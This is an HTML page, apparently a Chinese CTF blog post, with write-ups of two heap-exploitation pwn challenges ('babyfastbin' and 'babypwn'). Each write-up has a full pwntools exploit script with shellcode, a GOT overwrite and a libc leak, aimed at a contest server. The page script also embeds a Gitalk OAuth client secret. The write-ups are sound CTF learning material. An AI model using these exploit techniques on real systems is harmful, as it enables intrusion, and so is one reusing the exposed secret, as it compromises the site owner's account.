@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="Purse the balance of everything.">
+  <meta name="keywords" content="CTF, Blog">
+  
+    <link rel="icon" href>
+  
+    
+  <title>月赛乙队题目记录-2019-04-05 | Mads Blog</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/gitalk.css">
+  <script src="/lib/gitalk.min.js"></script>
+  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">
+
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <i class="fas fa-cat" style="margin-right: 10px"></i>
+      <span>Mads Blog</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content aath-body">
+          <h1>月赛乙队题目记录-2019-04-05</h1>
+          
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019年04月05日</time>
+            
+            
+              | 
+                  <i class="fa fa-tags" aria-hidden="true"></i>
+                
+               
+  <a href="/tags/#CTF" class='tag'>CTF</a>
+
+  <a href="/tags/#PWN" class='tag'>PWN</a>
+
+  <a href="/tags/#月赛" class='tag'>月赛</a>
+
+
+            
+            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年04月05日</time>
+          </div>
+          
+          <p>被红队新进的两位大佬支配了。 这次做了两道pwn， 也还算有参与度把。感觉自己做题速度太慢了，可能也是不熟练的缘故，但更多的是感觉思路没有理的很好，这方面还需要注意总结与锻炼。</p>
+<h1 id="babyfastbin"><a href="#babyfastbin" class="headerlink" title="babyfastbin"></a>babyfastbin</h1><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>这道题漏洞很明显，指针在free之后没有置为NULL，典型的UAF。 题目限制只能分配小于128大小的bin，而且题目什么保护也没开。一开始想修改fd然后在GOT表上分配一个堆重写got表，但是发现它在malloc之后会memset然后立即调用一下printf就会崩溃。然后想到保护没开，可以将fd指向栈，在栈上分配一个fake chunk。然后修改ret address进行ROP或直接调shellcode。于是总结一下就可以：</p>
+<ol>
+<li>UAF写fd指向一个栈地址。（栈地址程序会打印出来，也算个提示）</li>
+<li>计算栈上堆到rbp距离，修改ret address跳到紧接着的栈地址（注意别从堆起始地址布置shellcode，要布置在ret address之后，不然会出问题</li>
+<li>get shell</li>
+</ol>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">pc=<span class="string">'./babyfastbin'</span></span><br><span class="line">remote_addr=[<span class="string">'124.16.75.162'</span>,<span class="number">40001</span>]</span><br><span class="line">aslr=<span class="keyword">True</span></span><br><span class="line">context.log_level=<span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfastbin'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line">    <span class="comment">#p = gdb.debug(pc,'b *0x400b73\nc\n')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(remote_addr[<span class="number">0</span>],remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raddr</span><span class="params">(a=<span class="number">6</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(l, d)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'0'</span>)</span><br><span class="line">    ru(<span class="string">'info: '</span>)</span><br><span class="line">    sl(str(l))</span><br><span class="line">    ru(<span class="string">'text: '</span>)</span><br><span class="line">    sl(d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx, d)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'again:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'info:'</span>)</span><br><span class="line">    sl(d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    system = <span class="number">0x4006b6</span></span><br><span class="line">    ls = <span class="number">0x400951</span></span><br><span class="line">    m = <span class="number">0x60209a</span></span><br><span class="line">    shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">   <span class="comment">#ru('name:')</span></span><br><span class="line">    sl(<span class="string">'p'</span>.ljust(<span class="number">5</span>, <span class="string">'\x00'</span>) + <span class="string">'sh\x00'</span>)</span><br><span class="line">    <span class="comment">#show(-120)</span></span><br><span class="line">    <span class="comment">#rv(6)</span></span><br><span class="line">    <span class="comment">#print hex(raddr())</span></span><br><span class="line">    ru(<span class="string">'@ '</span>)</span><br><span class="line">    stack = int(rv(<span class="number">15</span>))</span><br><span class="line">    sh = stack + <span class="number">8</span></span><br><span class="line">    pop_rdi = <span class="number">0x0000000000400d63</span></span><br><span class="line">    print(hex(stack))</span><br><span class="line">    malloc(<span class="number">96</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    update(<span class="number">0</span>, p64(stack - <span class="number">16</span>))</span><br><span class="line">    malloc(<span class="number">96</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">    malloc(<span class="number">96</span>,<span class="string">'\x00'</span>*<span class="number">8</span> + shellcode +<span class="string">'\x00'</span>*<span class="number">13</span> + p64(stack + <span class="number">56</span>) + shellcode)</span><br><span class="line">    exit()</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h1><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>这道题稍微复杂点，分配堆块时会分配两个，一个大小可以自己确定，另一个大小固定为<code>0x80</code>。先分配的是自定义大小，然后分配另一个。仔细观察会发现在分配堆时对自定义大小堆进行写入时存在4个字节的溢出，这样就可以修改下一个堆(0x80)的大小。这道题没有给任何地址，需要先leak。整体思路大概是：</p>
+<ol>
+<li>分配4个姊妹堆（为了不出现和topchunk合并等问题）姊妹堆自定义的要为fastbin，不然free之后会和0x80大小的堆合并</li>
+<li>update 2号堆通过溢出修改姊妹堆后一个堆(0x80)的大小，使其刚好将紧邻的下一个姊妹堆覆盖</li>
+<li>free 2号堆之后，再malloc两次和之前一样大小的姊妹堆4和5，这样3号堆就相当于有两个指针3和5一起指向它</li>
+<li>free掉5号堆，这样3号指针就指向了一个free掉的unsorted bin，通过display读取得到一个libc地址，泄漏出libc地址</li>
+<li>申请一个自定义大小为0x80的姊妹堆6，update6号为printf got地址，就相当于修改了3号堆中指向自定义堆的地址</li>
+<li>update 3号堆，覆盖printf地址为one gadget地址</li>
+</ol>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">pc=<span class="string">'./x'</span></span><br><span class="line">remote_addr=[<span class="string">'124.16.75.162'</span>,<span class="number">40002</span>]</span><br><span class="line">aslr=<span class="keyword">True</span></span><br><span class="line">context.log_level=<span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">elf = ELF(<span class="string">'./x'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line">    <span class="comment">#p = gdb.debug(pc,'b *0x400b73\nc\n')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(remote_addr[<span class="number">0</span>],remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raddr</span><span class="params">(a=<span class="number">6</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(l, l2, d, d2)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'0'</span>)</span><br><span class="line">    ru(<span class="string">'tion: '</span>)</span><br><span class="line">    sl(str(l))</span><br><span class="line">    ru(<span class="string">'name: '</span>)</span><br><span class="line">    sl(d)</span><br><span class="line">    ru(<span class="string">'length: '</span>)</span><br><span class="line">    sl(str(l2))</span><br><span class="line">    ru(<span class="string">'text: '</span>)</span><br><span class="line">    sl(d2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx,l,d)</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'length: '</span>)</span><br><span class="line">    sl(str(l))</span><br><span class="line">    ru(<span class="string">'text: '</span>)</span><br><span class="line">    sl(d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Action: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    printf = <span class="number">0x602038</span></span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'AAAA'</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">    update(<span class="number">1</span>,<span class="number">42</span>,<span class="string">'A'</span>*<span class="number">40</span>+<span class="string">'\x51\x01'</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'AAAA'</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">    malloc(<span class="number">32</span>,<span class="number">32</span>,<span class="string">'AAAA'</span>,<span class="string">'AAAA'</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">'name: '</span>)</span><br><span class="line">    libcb = raddr() - <span class="number">0x3c4b78</span></span><br><span class="line">    one = libcb + <span class="number">0xf1147</span></span><br><span class="line">    lg(<span class="string">'libc base'</span>, libcb)</span><br><span class="line">    malloc(<span class="number">128</span>, <span class="number">128</span>, <span class="string">'mads'</span>, p64(printf))</span><br><span class="line">    raw_input()</span><br><span class="line">    update(<span class="number">2</span>, <span class="number">8</span>, p64(one))</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+          
+<div class="post-copyright">
+<p><span>本文标题：</span>月赛乙队题目记录-2019-04-05</p>
+<p><span>文章作者：</span>Mads</p>
+<p><span>发布时间：</span>2019/04/05 12:00:00</p>
+<p><span>更新时间：</span>2019/04/05 08:44:23</p>
+<p><span>原始链接：</span><a style="color: #bababa" href=" + data.permalink + ">http://lxzmads.github.io/2019/04/05/月赛乙队题目记录-2019-04-05/</a></p>
+<p><span>许可协议：</span><i class="fab fa-creative-commons"></i><a rel="license" style="color: #bababa" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a><span class="warn">转载请保留原文链接及作者</span></p>
+</div>
+ 
+        </section>
+    </article>
+    
+    <div class="comment">
+        <div id="gitalk-container"></div>
+    </div>
+    
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#babyfastbin"><span class="toc-number">1.</span> <span class="toc-text">babyfastbin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babypwn"><span class="toc-number">2.</span> <span class="toc-text">babypwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.1.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<script type="text/javascript">
+const gitalk = new Gitalk({
+  clientID: "6ae565c159db15a6167c",
+  clientSecret: '6b81331560c108209346bc4807a5126da190e14c',
+  repo: 'blogcomments',
+  owner: 'lxzmads',
+  admin: ['lxzmads'],
+  id: decodeURI(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath-魔改版 by Mads</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
